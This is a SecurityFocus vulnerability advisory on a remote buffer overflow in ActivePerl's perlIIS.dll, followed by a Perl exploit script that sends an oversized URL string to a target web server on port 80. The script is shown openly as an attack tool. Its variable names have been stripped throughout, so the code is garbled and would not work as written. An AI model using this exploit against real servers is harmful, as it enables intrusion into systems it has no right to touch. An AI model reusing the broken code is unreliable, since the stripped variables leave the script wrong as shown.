source: http://www.securityfocus.com/bid/3526/info
  
ActivePerl is an implementation of the Perl scripting language for Microsoft Windows systems developed by Activestate. ActivePerl allows for high-performance integration with IIS using a DLL called 'perlIIS.dll' to handle a '.plx' ISAPI extension.
  
perlIIS.dll contains a remotely exploitable buffer overflow vulnerability in handling of the URL string. It is due to an unbounded string copy operation.
  
All versions of ActivePerl prior to build 630 of ActivePerl 5.6.1 are believed to be vulnerable. This vulnerability requires that the option "Check that file exists" be disabled. This option is enabled by default.
  
Exploitation of this vulnerability may allow for remote attackers to gain access to the target server.

#!/usr/bin/perl -w

use IO::Socket;

 = "ActivePerl 5.6.1.629";

unless (@ARGV == 1) {
  print "\n Exploit by Sapient2003\n";
  die "usage: -bash <host to exploit>\n";
}
print "\n Exploit by Sapient2003\n";

 = "A" x 360;
 = "GET /.pl HTTP/1.0\n\n";

 = IO::Socket::INET->new(
        PeerAddr => [0],
        PeerPort => 80,
        Proto    => "tcp",
) or die "Can't find host [0]\n";
print  ;
print "Attempted to exploit [0]...\n";
close();
